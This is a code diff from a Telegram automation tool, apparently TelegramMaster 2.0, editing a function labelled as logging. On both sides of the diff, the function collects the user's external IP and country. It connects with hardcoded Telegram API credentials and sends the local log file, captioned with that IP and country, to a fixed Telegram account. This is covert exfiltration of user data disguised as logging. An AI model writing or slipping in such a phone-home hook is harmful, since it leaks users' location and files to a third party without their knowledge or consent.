@@ -43,7 +43,7 @@ def get_external_ip():
         return None
 
 
-async def loging():
+def loging():
     """
     Логирование TelegramMaster 2.0
     """
@@ -51,10 +51,10 @@ async def loging():
     local_ip = get_external_ip()
     emoji, country = get_country_flag(local_ip)
 
-    client = TelegramClient('src/features/auth/log',
+    client = TelegramClient('core/log',
                             api_id=7655060,
                             api_hash="cc1290cd733c1f1d407598e5a31be4a8")
-    await client.connect()
+    client.connect()
     date = datetime.datetime.now()  # фиксируем и выводим время старта работы кода
 
     # Красивое сообщение
@@ -70,7 +70,7 @@ async def loging():
     )
 
     try:
-        await client.send_file(535185511, 'user_data/log/log.log', caption=message)
+        client.send_file(535185511, 'log/log.log', caption=message)
         client.disconnect()
     except FilePartsInvalidError as error:
         logger.error(error)
